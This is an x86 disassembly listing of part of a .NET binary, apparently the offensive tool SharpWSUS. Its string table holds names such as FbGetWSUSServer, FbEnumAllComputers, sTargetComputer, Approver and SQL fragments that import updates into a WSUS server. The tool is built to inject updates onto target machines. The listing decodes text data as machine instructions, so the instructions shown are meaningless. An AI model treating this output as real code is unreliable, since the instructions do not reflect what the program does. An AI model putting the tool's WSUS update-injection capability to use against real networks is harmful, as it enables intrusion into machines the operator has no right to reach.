  406851:	45                   	inc    %ebp
  406852:	78 65                	js     0x4068b9
  406854:	63 75 74             	arpl   %esi,0x74(%ebp)
  406857:	65 52                	gs push %edx
  406859:	65 61                	gs popa
  40685b:	64 65 72 00          	fs gs jb 0x40685f
  40685f:	53                   	push   %ebx
  406860:	74 72                	je     0x4068d4
  406862:	69 6e 67 42 75 69 6c 	imul   $0x6c697542,0x67(%esi),%ebp
  406869:	64 65 72 00          	fs gs jb 0x40686d
  40686d:	41                   	inc    %ecx
  40686e:	72 67                	jb     0x4068d7
  406870:	75 6d                	jne    0x4068df
  406872:	65 6e                	outsb  %gs:(%esi),(%dx)
  406874:	74 50                	je     0x4068c6
  406876:	61                   	popa
  406877:	72 73                	jb     0x4068ec
  406879:	65 72 00             	gs jb  0x40687c
  40687c:	42                   	inc    %edx
  40687d:	69 74 43 6f 6e 76 65 	imul   $0x7265766e,0x6f(%ebx,%eax,2),%esi
  406884:	72 
  406885:	74 65                	je     0x4068ec
  406887:	72 00                	jb     0x406889
  406889:	73 54                	jae    0x4068df
  40688b:	61                   	popa
  40688c:	72 67                	jb     0x4068f5
  40688e:	65 74 43             	gs je  0x4068d4
  406891:	6f                   	outsl  %ds:(%esi),(%dx)
  406892:	6d                   	insl   (%dx),%es:(%edi)
  406893:	70 75                	jo     0x40690a
  406895:	74 65                	je     0x4068fc
  406897:	72 00                	jb     0x406899
  406899:	41                   	inc    %ecx
  40689a:	70 70                	jo     0x40690c
  40689c:	72 6f                	jb     0x40690d
  40689e:	76 65                	jbe    0x406905
  4068a0:	72 00                	jb     0x4068a2
  4068a2:	46                   	inc    %esi
  4068a3:	62 47 65             	bound  %eax,0x65(%edi)
  4068a6:	74 57                	je     0x4068ff
  4068a8:	53                   	push   %ebx
  4068a9:	55                   	push   %ebp
  4068aa:	53                   	push   %ebx
  4068ab:	53                   	push   %ebx
  4068ac:	65 72 76             	gs jb  0x406925
  4068af:	65 72 00             	gs jb  0x4068b2
  4068b2:	49                   	dec    %ecx
  4068b3:	45                   	inc    %ebp
  4068b4:	6e                   	outsb  %ds:(%esi),(%dx)
  4068b5:	75 6d                	jne    0x406924
  4068b7:	65 72 61             	gs jb  0x40691b
  4068ba:	74 6f                	je     0x40692b
  4068bc:	72 00                	jb     0x4068be
  4068be:	47                   	inc    %edi
  4068bf:	65 74 45             	gs je  0x406907
  4068c2:	6e                   	outsb  %ds:(%esi),(%dx)
  4068c3:	75 6d                	jne    0x406932
  4068c5:	65 72 61             	gs jb  0x406929
  4068c8:	74 6f                	je     0x406939
  4068ca:	72 00                	jb     0x4068cc
  4068cc:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  4068d1:	00 2e                	add    %ch,(%esi)
  4068d3:	63 63 74             	arpl   %esp,0x74(%ebx)
  4068d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4068d7:	72 00                	jb     0x4068d9
  4068d9:	55                   	push   %ebp
  4068da:	49                   	dec    %ecx
  4068db:	6e                   	outsb  %ds:(%esi),(%dx)
  4068dc:	74 50                	je     0x40692e
  4068de:	74 72                	je     0x406952
  4068e0:	00 53 79             	add    %dl,0x79(%ebx)
  4068e3:	73 74                	jae    0x406959
  4068e5:	65 6d                	gs insl (%dx),%es:(%edi)
  4068e7:	2e 44                	cs inc %esp
  4068e9:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  4068f0:	69 63 73 00 53 68 61 	imul   $0x61685300,0x73(%ebx),%esp
  4068f7:	72 70                	jb     0x406969
  4068f9:	57                   	push   %edi
  4068fa:	53                   	push   %ebx
  4068fb:	55                   	push   %ebp
  4068fc:	53                   	push   %ebx
  4068fd:	2e 43                	cs inc %ebx
  4068ff:	6f                   	outsl  %ds:(%esi),(%dx)
  406900:	6d                   	insl   (%dx),%es:(%edi)
  406901:	6d                   	insl   (%dx),%es:(%edi)
  406902:	61                   	popa
  406903:	6e                   	outsb  %ds:(%esi),(%dx)
  406904:	64 73 00             	fs jae 0x406907
  406907:	5f                   	pop    %edi
  406908:	61                   	popa
  406909:	76 61                	jbe    0x40696c
  40690b:	69 6c 61 62 6c 65 43 	imul   $0x6f43656c,0x62(%ecx,%eiz,2),%ebp
  406912:	6f 
  406913:	6d                   	insl   (%dx),%es:(%edi)
  406914:	6d                   	insl   (%dx),%es:(%edi)
  406915:	61                   	popa
  406916:	6e                   	outsb  %ds:(%esi),(%dx)
  406917:	64 73 00             	fs jae 0x40691a
  40691a:	57                   	push   %edi
  40691b:	4f                   	dec    %edi
  40691c:	57                   	push   %edi
  40691d:	36 34 5f             	ss xor $0x5f,%al
  406920:	52                   	push   %edx
  406921:	65 73 00             	gs jae 0x406924
  406924:	53                   	push   %ebx
  406925:	79 73                	jns    0x40699a
  406927:	74 65                	je     0x40698e
  406929:	6d                   	insl   (%dx),%es:(%edi)
  40692a:	2e 52                	cs push %edx
  40692c:	75 6e                	jne    0x40699c
  40692e:	74 69                	je     0x406999
  406930:	6d                   	insl   (%dx),%es:(%edi)
  406931:	65 2e 49             	gs cs dec %ecx
  406934:	6e                   	outsb  %ds:(%esi),(%dx)
  406935:	74 65                	je     0x40699c
  406937:	72 6f                	jb     0x4069a8
  406939:	70 53                	jo     0x40698e
  40693b:	65 72 76             	gs jb  0x4069b4
  40693e:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  406945:	73 74                	jae    0x4069bb
  406947:	65 6d                	gs insl (%dx),%es:(%edi)
  406949:	2e 52                	cs push %edx
  40694b:	75 6e                	jne    0x4069bb
  40694d:	74 69                	je     0x4069b8
  40694f:	6d                   	insl   (%dx),%es:(%edi)
  406950:	65 2e 43             	gs cs inc %ebx
  406953:	6f                   	outsl  %ds:(%esi),(%dx)
  406954:	6d                   	insl   (%dx),%es:(%edi)
  406955:	70 69                	jo     0x4069c0
  406957:	6c                   	insb   (%dx),%es:(%edi)
  406958:	65 72 53             	gs jb  0x4069ae
  40695b:	65 72 76             	gs jb  0x4069d4
  40695e:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
  406965:	62 75 67             	bound  %esi,0x67(%ebp)
  406968:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  40696f:	65 
  406970:	73 00                	jae    0x406972
  406972:	45                   	inc    %ebp
  406973:	78 70                	js     0x4069e5
  406975:	61                   	popa
  406976:	6e                   	outsb  %ds:(%esi),(%dx)
  406977:	64 45                	fs inc %ebp
  406979:	6e                   	outsb  %ds:(%esi),(%dx)
  40697a:	76 69                	jbe    0x4069e5
  40697c:	72 6f                	jb     0x4069ed
  40697e:	6e                   	outsb  %ds:(%esi),(%dx)
  40697f:	6d                   	insl   (%dx),%es:(%edi)
  406980:	65 6e                	outsb  %gs:(%esi),(%dx)
  406982:	74 56                	je     0x4069da
  406984:	61                   	popa
  406985:	72 69                	jb     0x4069f0
  406987:	61                   	popa
  406988:	62 6c 65 73          	bound  %ebp,0x73(%ebp,%eiz,2)
  40698c:	00 47 65             	add    %al,0x65(%edi)
  40698f:	74 42                	je     0x4069d3
  406991:	79 74                	jns    0x406a07
  406993:	65 73 00             	gs jae 0x406996
  406996:	53                   	push   %ebx
  406997:	68 61 72 70 57       	push   $0x57707261
  40699c:	53                   	push   %ebx
  40699d:	55                   	push   %ebp
  40699e:	53                   	push   %ebx
  40699f:	2e 41                	cs inc %ecx
  4069a1:	72 67                	jb     0x406a0a
  4069a3:	73 00                	jae    0x4069a5
  4069a5:	73 50                	jae    0x4069f7
  4069a7:	41                   	inc    %ecx
  4069a8:	72 67                	jb     0x406a11
  4069aa:	73 00                	jae    0x4069ac
  4069ac:	50                   	push   %eax
  4069ad:	61                   	popa
  4069ae:	79 6c                	jns    0x406a1c
  4069b0:	6f                   	outsl  %ds:(%esi),(%dx)
  4069b1:	61                   	popa
  4069b2:	64 41                	fs inc %ecx
  4069b4:	72 67                	jb     0x406a1d
  4069b6:	73 00                	jae    0x4069b8
  4069b8:	70 61                	jo     0x406a1b
  4069ba:	72 73                	jb     0x406a2f
  4069bc:	65 64 41             	gs fs inc %ecx
  4069bf:	72 67                	jb     0x406a28
  4069c1:	73 00                	jae    0x4069c3
  4069c3:	73 41                	jae    0x406a06
  4069c5:	72 67                	jb     0x406a2e
  4069c7:	73 00                	jae    0x4069c9
  4069c9:	61                   	popa
  4069ca:	72 67                	jb     0x406a33
  4069cc:	73 00                	jae    0x4069ce
  4069ce:	46                   	inc    %esi
  4069cf:	76 4f                	jbe    0x406a20
  4069d1:	53                   	push   %ebx
  4069d2:	44                   	inc    %esp
  4069d3:	65 74 61             	gs je  0x406a37
  4069d6:	69 6c 73 00 47 65 74 	imul   $0x53746547,0x0(%ebx,%esi,2),%ebp
  4069dd:	53 
  4069de:	65 72 76             	gs jb  0x406a57
  4069e1:	65 72 44             	gs jb  0x406a28
  4069e4:	65 74 61             	gs je  0x406a48
  4069e7:	69 6c 73 00 44 6e 73 	imul   $0x736e44,0x0(%ebx,%esi,2),%ebp
  4069ee:	00 
  4069ef:	43                   	inc    %ebx
  4069f0:	6f                   	outsl  %ds:(%esi),(%dx)
  4069f1:	6e                   	outsb  %ds:(%esi),(%dx)
  4069f2:	74 61                	je     0x406a55
  4069f4:	69 6e 73 00 53 79 73 	imul   $0x73795300,0x73(%esi),%ebp
  4069fb:	74 65                	je     0x406a62
  4069fd:	6d                   	insl   (%dx),%es:(%edi)
  4069fe:	2e 43                	cs inc %ebx
  406a00:	6f                   	outsl  %ds:(%esi),(%dx)
  406a01:	6c                   	insb   (%dx),%es:(%edi)
  406a02:	6c                   	insb   (%dx),%es:(%edi)
  406a03:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  406a08:	6e                   	outsb  %ds:(%esi),(%dx)
  406a09:	73 00                	jae    0x406a0b
  406a0b:	75 6c                	jne    0x406a79
  406a0d:	4f                   	dec    %edi
  406a0e:	70 74                	jo     0x406a84
  406a10:	69 6f 6e 73 00 46 62 	imul   $0x62460073,0x6e(%edi),%ebp
  406a17:	45                   	inc    %ebp
  406a18:	6e                   	outsb  %ds:(%esi),(%dx)
  406a19:	75 6d                	jne    0x406a88
  406a1b:	47                   	inc    %edi
  406a1c:	72 6f                	jb     0x406a8d
  406a1e:	75 70                	jne    0x406a90
  406a20:	73 00                	jae    0x406a22
  406a22:	46                   	inc    %esi
  406a23:	62 45 6e             	bound  %eax,0x6e(%ebp)
  406a26:	75 6d                	jne    0x406a95
  406a28:	41                   	inc    %ecx
  406a29:	6c                   	insb   (%dx),%es:(%edi)
  406a2a:	6c                   	insb   (%dx),%es:(%edi)
  406a2b:	43                   	inc    %ebx
  406a2c:	6f                   	outsl  %ds:(%esi),(%dx)
  406a2d:	6d                   	insl   (%dx),%es:(%edi)
  406a2e:	70 75                	jo     0x406aa5
  406a30:	74 65                	je     0x406a97
  406a32:	72 73                	jb     0x406aa7
  406a34:	00 46 69             	add    %al,0x69(%esi)
  406a37:	6c                   	insb   (%dx),%es:(%edi)
  406a38:	65 41                	gs inc %ecx
  406a3a:	63 63 65             	arpl   %esp,0x65(%ebx)
  406a3d:	73 73                	jae    0x406ab2
  406a3f:	00 41 6c             	add    %al,0x6c(%ecx)
  406a42:	6c                   	insb   (%dx),%es:(%edi)
  406a43:	41                   	inc    %ecx
  406a44:	63 63 65             	arpl   %esp,0x65(%ebx)
  406a47:	73 73                	jae    0x406abc
  406a49:	00 53 75             	add    %dl,0x75(%ebx)
  406a4c:	63 63 65             	arpl   %esp,0x65(%ebx)
  406a4f:	73 73                	jae    0x406ac4
  406a51:	00 67 65             	add    %ah,0x65(%edi)
  406a54:	74 5f                	je     0x406ab5
  406a56:	41                   	inc    %ecx
  406a57:	72 67                	jb     0x406ac0
  406a59:	75 6d                	jne    0x406ac8
  406a5b:	65 6e                	outsb  %gs:(%esi),(%dx)
  406a5d:	74 73                	je     0x406ad2
  406a5f:	00 61 72             	add    %ah,0x72(%ecx)
  406a62:	67 75 6d             	addr16 jne 0x406ad2
  406a65:	65 6e                	outsb  %gs:(%esi),(%dx)
  406a67:	74 73                	je     0x406adc
  406a69:	00 47 72             	add    %al,0x72(%edi)
  406a6c:	6f                   	outsl  %ds:(%esi),(%dx)
  406a6d:	75 70                	jne    0x406adf
  406a6f:	45                   	inc    %ebp
  406a70:	78 69                	js     0x406adb
  406a72:	73 74                	jae    0x406ae8
  406a74:	73 00                	jae    0x406a76
  406a76:	46                   	inc    %esi
  406a77:	62 47 65             	bound  %eax,0x65(%edi)
  406a7a:	74 55                	je     0x406ad1
  406a7c:	70 64                	jo     0x406ae2
  406a7e:	61                   	popa
  406a7f:	74 65                	je     0x406ae6
  406a81:	53                   	push   %ebx
  406a82:	74 61                	je     0x406ae5
  406a84:	74 75                	je     0x406afb
  406a86:	73 00                	jae    0x406a88
  406a88:	67 65 74 5f          	addr16 gs je 0x406aeb
  406a8c:	52                   	push   %edx
  406a8d:	6f                   	outsl  %ds:(%esi),(%dx)
  406a8e:	77 73                	ja     0x406b03
  406a90:	00 45 6e             	add    %al,0x6e(%ebp)
  406a93:	75 6d                	jne    0x406b02
  406a95:	65 72 61             	gs jb  0x406af9
  406a98:	74 65                	je     0x406aff
  406a9a:	53                   	push   %ebx
  406a9b:	75 62                	jne    0x406aff
  406a9d:	4b                   	dec    %ebx
  406a9e:	65 79 73             	gs jns 0x406b14
  406aa1:	00 43 6f             	add    %al,0x6f(%ebx)
  406aa4:	6e                   	outsb  %ds:(%esi),(%dx)
  406aa5:	63 61 74             	arpl   %esp,0x74(%ecx)
  406aa8:	00 4f 62             	add    %cl,0x62(%edi)
  406aab:	6a 65                	push   $0x65
  406aad:	63 74 00 43          	arpl   %esi,0x43(%eax,%eax,1)
  406ab1:	6f                   	outsl  %ds:(%esi),(%dx)
  406ab2:	6e                   	outsb  %ds:(%esi),(%dx)
  406ab3:	6e                   	outsb  %ds:(%esi),(%dx)
  406ab4:	65 63 74 00 49       	arpl   %esi,%gs:0x49(%eax,%eax,1)
  406ab9:	6e                   	outsb  %ds:(%esi),(%dx)
  406aba:	73 70                	jae    0x406b2c
  406abc:	65 63 74 00 53       	arpl   %esi,%gs:0x53(%eax,%eax,1)
  406ac1:	79 73                	jns    0x406b36
  406ac3:	74 65                	je     0x406b2a
  406ac5:	6d                   	insl   (%dx),%es:(%edi)
  406ac6:	2e 4e                	cs dec %esi
  406ac8:	65 74 00             	gs je  0x406acb
  406acb:	46                   	inc    %esi
  406acc:	62 47 65             	bound  %eax,0x65(%edi)
  406acf:	74 43                	je     0x406b14
  406ad1:	6f                   	outsl  %ds:(%esi),(%dx)
  406ad2:	6d                   	insl   (%dx),%es:(%edi)
  406ad3:	70 75                	jo     0x406b4a
  406ad5:	74 65                	je     0x406b3c
  406ad7:	72 54                	jb     0x406b2d
  406ad9:	61                   	popa
  406ada:	72 67                	jb     0x406b43
  406adc:	65 74 00             	gs je  0x406adf
  406adf:	70 68                	jo     0x406b49
  406ae1:	6b 52 65 73          	imul   $0x73,0x65(%edx),%edx
  406ae5:	75 6c                	jne    0x406b53
  406ae7:	74 00                	je     0x406ae9
  406ae9:	41                   	inc    %ecx
  406aea:	72 67                	jb     0x406b53
  406aec:	75 6d                	jne    0x406b5b
  406aee:	65 6e                	outsb  %gs:(%esi),(%dx)
  406af0:	74 50                	je     0x406b42
  406af2:	61                   	popa
  406af3:	72 73                	jb     0x406b68
  406af5:	65 72 52             	gs jb  0x406b4a
  406af8:	65 73 75             	gs jae 0x406b70
  406afb:	6c                   	insb   (%dx),%es:(%edi)
  406afc:	74 00                	je     0x406afe
  406afe:	53                   	push   %ebx
  406aff:	79 73                	jns    0x406b74
  406b01:	74 65                	je     0x406b68
  406b03:	6d                   	insl   (%dx),%es:(%edi)
  406b04:	2e 44                	cs inc %esp
  406b06:	61                   	popa
  406b07:	74 61                	je     0x406b6a
  406b09:	2e 53                	cs push %ebx
  406b0b:	71 6c                	jno    0x406b79
  406b0d:	43                   	inc    %ebx
  406b0e:	6c                   	insb   (%dx),%es:(%edi)
  406b0f:	69 65 6e 74 00 46 62 	imul   $0x62460074,0x6e(%ebp),%esp
  406b16:	50                   	push   %eax
  406b17:	72 65                	jb     0x406b7e
  406b19:	70 61                	jo     0x406b7c
  406b1b:	72 65                	jb     0x406b82
  406b1d:	58                   	pop    %eax
  406b1e:	6d                   	insl   (%dx),%es:(%edi)
  406b1f:	6c                   	insb   (%dx),%es:(%edi)
  406b20:	42                   	inc    %edx
  406b21:	75 6e                	jne    0x406b91
  406b23:	64 6c                	fs insb (%dx),%es:(%edi)
  406b25:	65 54                	gs push %esp
  406b27:	6f                   	outsl  %ds:(%esi),(%dx)
  406b28:	43                   	inc    %ebx
  406b29:	6c                   	insb   (%dx),%es:(%edi)
  406b2a:	69 65 6e 74 00 46 62 	imul   $0x62460074,0x6e(%ebp),%esp
  406b31:	50                   	push   %eax
  406b32:	72 65                	jb     0x406b99
  406b34:	70 61                	jo     0x406b97
  406b36:	72 65                	jb     0x406b9d
  406b38:	58                   	pop    %eax
  406b39:	4d                   	dec    %ebp
  406b3a:	4c                   	dec    %esp
  406b3b:	74 6f                	je     0x406bac
  406b3d:	43                   	inc    %ebx
  406b3e:	6c                   	insb   (%dx),%es:(%edi)
  406b3f:	69 65 6e 74 00 45 6e 	imul   $0x6e450074,0x6e(%ebp),%esp
  406b46:	76 69                	jbe    0x406bb1
  406b48:	72 6f                	jb     0x406bb9
  406b4a:	6e                   	outsb  %ds:(%esi),(%dx)
  406b4b:	6d                   	insl   (%dx),%es:(%edi)
  406b4c:	65 6e                	outsb  %gs:(%esi),(%dx)
  406b4e:	74 00                	je     0x406b50
  406b50:	67 65 74 5f          	addr16 gs je 0x406bb3
  406b54:	43                   	inc    %ebx
  406b55:	75 72                	jne    0x406bc9
  406b57:	72 65                	jb     0x406bbe
  406b59:	6e                   	outsb  %ds:(%esi),(%dx)
  406b5a:	74 00                	je     0x406b5c
  406b5c:	67 65 74 5f          	addr16 gs je 0x406bbf
  406b60:	46                   	inc    %esi
  406b61:	69 65 6c 64 43 6f 75 	imul   $0x756f4364,0x6c(%ebp),%esp
  406b68:	6e                   	outsb  %ds:(%esi),(%dx)
  406b69:	74 00                	je     0x406b6b
  406b6b:	43                   	inc    %ebx
  406b6c:	6f                   	outsl  %ds:(%esi),(%dx)
  406b6d:	6e                   	outsb  %ds:(%esi),(%dx)
  406b6e:	76 65                	jbe    0x406bd5
  406b70:	72 74                	jb     0x406be6
  406b72:	00 4d 6f             	add    %cl,0x6f(%ebp)
  406b75:	76 65                	jbe    0x406bdc
  406b77:	4e                   	dec    %esi
  406b78:	65 78 74             	gs js  0x406bef
  406b7b:	00 53 79             	add    %dl,0x79(%ebx)
  406b7e:	73 74                	jae    0x406bf4
  406b80:	65 6d                	gs insl (%dx),%es:(%edi)
  406b82:	2e 54                	cs push %esp
  406b84:	65 78 74             	gs js  0x406bfb
  406b87:	00 73 65             	add    %dh,0x65(%ebx)
  406b8a:	74 5f                	je     0x406beb
  406b8c:	43                   	inc    %ebx
  406b8d:	6f                   	outsl  %ds:(%esi),(%dx)
  406b8e:	6d                   	insl   (%dx),%es:(%edi)
  406b8f:	6d                   	insl   (%dx),%es:(%edi)
  406b90:	61                   	popa
  406b91:	6e                   	outsb  %ds:(%esi),(%dx)
  406b92:	64 54                	fs push %esp
  406b94:	65 78 74             	gs js  0x406c0b
  406b97:	00 44 61 74          	add    %al,0x74(%ecx,%eiz,2)
  406b9b:	61                   	popa
  406b9c:	52                   	push   %edx
  406b9d:	6f                   	outsl  %ds:(%esi),(%dx)
  406b9e:	77 00                	ja     0x406ba0
  406ba0:	52                   	push   %edx
  406ba1:	65 67 51             	gs addr16 push %ecx
  406ba4:	75 65                	jne    0x406c0b
  406ba6:	72 79                	jb     0x406c21
  406ba8:	56                   	push   %esi
  406ba9:	61                   	popa
  406baa:	6c                   	insb   (%dx),%es:(%edi)
  406bab:	75 65                	jne    0x406c12
  406bad:	45                   	inc    %ebp
  406bae:	78 00                	js     0x406bb0
  406bb0:	52                   	push   %edx
  406bb1:	65 67 4f             	gs addr16 dec %edi
  406bb4:	70 65                	jo     0x406c1b
  406bb6:	6e                   	outsb  %ds:(%esi),(%dx)
  406bb7:	4b                   	dec    %ebx
  406bb8:	65 79 45             	gs jns 0x406c00
  406bbb:	78 00                	js     0x406bbd
  406bbd:	68 65 78 00 54       	push   $0x54007865
  406bc2:	6f                   	outsl  %ds:(%esi),(%dx)
  406bc3:	43                   	inc    %ebx
  406bc4:	68 61 72 41 72       	push   $0x72417261
  406bc9:	72 61                	jb     0x406c2c
  406bcb:	79 00                	jns    0x406bcd
  406bcd:	57                   	push   %edi
  406bce:	4f                   	dec    %edi
  406bcf:	57                   	push   %edi
  406bd0:	36 34 5f             	ss xor $0x5f,%al
  406bd3:	33 32                	xor    (%edx),%esi
  406bd5:	4b                   	dec    %ebx
  406bd6:	65 79 00             	gs jns 0x406bd9
  406bd9:	57                   	push   %edi
  406bda:	4f                   	dec    %edi
  406bdb:	57                   	push   %edi
  406bdc:	36 34 5f             	ss xor $0x5f,%al
  406bdf:	36 34 4b             	ss xor $0x4b,%al
  406be2:	65 79 00             	gs jns 0x406be5
  406be5:	43                   	inc    %ebx
  406be6:	72 65                	jb     0x406c4d
  406be8:	61                   	popa
  406be9:	74 65                	je     0x406c50
  406beb:	53                   	push   %ebx
  406bec:	75 62                	jne    0x406c50
  406bee:	4b                   	dec    %ebx
  406bef:	65 79 00             	gs jns 0x406bf2
  406bf2:	6c                   	insb   (%dx),%es:(%edi)
  406bf3:	70 53                	jo     0x406c48
  406bf5:	75 62                	jne    0x406c59
  406bf7:	4b                   	dec    %ebx
  406bf8:	65 79 00             	gs jns 0x406bfb
  406bfb:	52                   	push   %edx
  406bfc:	65 67 43             	gs addr16 inc %ebx
  406bff:	6c                   	insb   (%dx),%es:(%edi)
  406c00:	6f                   	outsl  %ds:(%esi),(%dx)
  406c01:	73 65                	jae    0x406c68
  406c03:	4b                   	dec    %ebx
  406c04:	65 79 00             	gs jns 0x406c07
  406c07:	68 4b 65 79 00       	push   $0x79654b
  406c0c:	43                   	inc    %ebx
  406c0d:	6f                   	outsl  %ds:(%esi),(%dx)
  406c0e:	6e                   	outsb  %ds:(%esi),(%dx)
  406c0f:	74 61                	je     0x406c72
  406c11:	69 6e 73 4b 65 79 00 	imul   $0x79654b,0x73(%esi),%ebp
  406c18:	69 6e 33 32 6f 72 36 	imul   $0x36726f32,0x33(%esi),%ebp
  406c1f:	34 6b                	xor    $0x6b,%al
  406c21:	65 79 00             	gs jns 0x406c24
  406c24:	4e                   	dec    %esi
  406c25:	6f                   	outsl  %ds:(%esi),(%dx)
  406c26:	74 69                	je     0x406c91
  406c28:	66 79 00             	data16 jns 0x406c2b
  406c2b:	53                   	push   %ebx
  406c2c:	79 73                	jns    0x406ca1
  406c2e:	74 65                	je     0x406c95
  406c30:	6d                   	insl   (%dx),%es:(%edi)
  406c31:	2e 53                	cs push %ebx
  406c33:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  406c37:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  406c3e:	70 
  406c3f:	74 6f                	je     0x406cb0
  406c41:	67 72 61             	addr16 jb 0x406ca5
  406c44:	70 68                	jo     0x406cae
  406c46:	79 00                	jns    0x406c48
  406c48:	43                   	inc    %ebx
  406c49:	6f                   	outsl  %ds:(%esi),(%dx)
  406c4a:	70 79                	jo     0x406cc5
  406c4c:	00 46 76             	add    %al,0x76(%esi)
  406c4f:	43                   	inc    %ebx
  406c50:	6f                   	outsl  %ds:(%esi),(%dx)
  406c51:	6e                   	outsb  %ds:(%esi),(%dx)
  406c52:	74 65                	je     0x406cb9
  406c54:	6e                   	outsb  %ds:(%esi),(%dx)
  406c55:	74 44                	je     0x406c9b
  406c57:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  406c5e:	79 00                	jns    0x406c60
  406c60:	49                   	dec    %ecx
  406c61:	50                   	push   %eax
  406c62:	48                   	dec    %eax
  406c63:	6f                   	outsl  %ds:(%esi),(%dx)
  406c64:	73 74                	jae    0x406cda
  406c66:	45                   	inc    %ebp
  406c67:	6e                   	outsb  %ds:(%esi),(%dx)
  406c68:	74 72                	je     0x406cdc
  406c6a:	79 00                	jns    0x406c6c
  406c6c:	47                   	inc    %edi
  406c6d:	65 74 48             	gs je  0x406cb8
  406c70:	6f                   	outsl  %ds:(%esi),(%dx)
  406c71:	73 74                	jae    0x406ce7
  406c73:	45                   	inc    %ebp
  406c74:	6e                   	outsb  %ds:(%esi),(%dx)
  406c75:	74 72                	je     0x406ce9
  406c77:	79 00                	jns    0x406c79
  406c79:	52                   	push   %edx
  406c7a:	65 67 69 73 74 72 79 	imul   $0x6f007972,%gs:0x74(%bp,%di),%esi
  406c81:	00 6f 
  406c83:	70 5f                	jo     0x406ce4
  406c85:	45                   	inc    %ebp
  406c86:	71 75                	jno    0x406cfd
  406c88:	61                   	popa
  406c89:	6c                   	insb   (%dx),%es:(%edi)
  406c8a:	69 74 79 00 6f 70 5f 	imul   $0x495f706f,0x0(%ecx,%edi,2),%esi
  406c91:	49 
  406c92:	6e                   	outsb  %ds:(%esi),(%dx)
  406c93:	65 71 75             	gs jno 0x406d0b
  406c96:	61                   	popa
  406c97:	6c                   	insb   (%dx),%es:(%edi)
  406c98:	69 74 79 00 48 74 74 	imul   $0x70747448,0x0(%ecx,%edi,2),%esi
  406c9f:	70 
  406ca0:	55                   	push   %ebp
  406ca1:	74 69                	je     0x406d0c
  406ca3:	6c                   	insb   (%dx),%es:(%edi)
  406ca4:	69 74 79 00 49 73 4e 	imul   $0x754e7349,0x0(%ecx,%edi,2),%esi
  406cab:	75 
  406cac:	6c                   	insb   (%dx),%es:(%edi)
  406cad:	6c                   	insb   (%dx),%es:(%edi)
  406cae:	4f                   	dec    %edi
  406caf:	72 45                	jb     0x406cf6
  406cb1:	6d                   	insl   (%dx),%es:(%edi)
  406cb2:	70 74                	jo     0x406d28
  406cb4:	79 00                	jns    0x406cb6
  406cb6:	00 00                	add    %al,(%eax)
  406cb8:	00 2d 64 00 65 00    	add    %ch,0x650064
  406cbe:	63 00                	arpl   %eax,(%eax)
  406cc0:	6c                   	insb   (%dx),%es:(%edi)
  406cc1:	00 61 00             	add    %ah,0x0(%ecx)
  406cc4:	72 00                	jb     0x406cc6
  406cc6:	65 00 20             	add    %ah,%gs:(%eax)
  406cc9:	00 40 00             	add    %al,0x0(%eax)
  406ccc:	69 00 49 00 6d 00    	imul   $0x6d0049,(%eax),%eax
  406cd2:	70 00                	jo     0x406cd4
  406cd4:	6f                   	outsl  %ds:(%esi),(%dx)
  406cd5:	00 72 00             	add    %dh,0x0(%edx)
  406cd8:	74 00                	je     0x406cda
  406cda:	65 00 64 00 20       	add    %ah,%gs:0x20(%eax,%eax,1)
  406cdf:	00 69 00             	add    %ch,0x0(%ecx)
  406ce2:	6e                   	outsb  %ds:(%esi),(%dx)
  406ce3:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  406ce7:	3b 64 00 65          	cmp    0x65(%eax,%eax,1),%esp
  406ceb:	00 63 00             	add    %ah,0x0(%ebx)
  406cee:	6c                   	insb   (%dx),%es:(%edi)
  406cef:	00 61 00             	add    %ah,0x0(%ecx)
  406cf2:	72 00                	jb     0x406cf4
  406cf4:	65 00 20             	add    %ah,%gs:(%eax)
  406cf7:	00 40 00             	add    %al,0x0(%eax)
  406cfa:	69 00 4c 00 6f 00    	imul   $0x6f004c,(%eax),%eax
  406d00:	63 00                	arpl   %eax,(%eax)
  406d02:	61                   	popa
  406d03:	00 6c 00 52          	add    %ch,0x52(%eax,%eax,1)
  406d07:	00 65 00             	add    %ah,0x0(%ebp)
  406d0a:	76 00                	jbe    0x406d0c
  406d0c:	69 00 73 00 69 00    	imul   $0x690073,(%eax),%eax
  406d12:	6f                   	outsl  %ds:(%esi),(%dx)
  406d13:	00 6e 00             	add    %ch,0x0(%esi)
  406d16:	49                   	dec    %ecx
  406d17:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  406d1b:	00 69 00             	add    %ch,0x0(%ecx)
  406d1e:	6e                   	outsb  %ds:(%esi),(%dx)
  406d1f:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  406d23:	43                   	inc    %ebx
  406d24:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  406d28:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  406d2c:	20 00                	and    %al,(%eax)
  406d2e:	73 00                	jae    0x406d30
  406d30:	70 00                	jo     0x406d32
  406d32:	49                   	dec    %ecx
  406d33:	00 6d 00             	add    %ch,0x0(%ebp)
  406d36:	70 00                	jo     0x406d38
  406d38:	6f                   	outsl  %ds:(%esi),(%dx)
  406d39:	00 72 00             	add    %dh,0x0(%edx)
  406d3c:	74 00                	je     0x406d3e
  406d3e:	55                   	push   %ebp
  406d3f:	00 70 00             	add    %dh,0x0(%eax)
  406d42:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  406d46:	74 00                	je     0x406d48
  406d48:	65 00 20             	add    %ah,%gs:(%eax)
  406d4b:	00 40 00             	add    %al,0x0(%eax)
  406d4e:	55                   	push   %ebp
  406d4f:	00 70 00             	add    %dh,0x0(%eax)
  406d52:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  406d56:	74 00                	je     0x406d58
  406d58:	65 00 58 00          	add    %bl,%gs:0x0(%eax)
  406d5c:	6d                   	insl   (%dx),%es:(%edi)
  406d5d:	00 6c 00 3d          	add    %ch,0x3d(%eax,%eax,1)
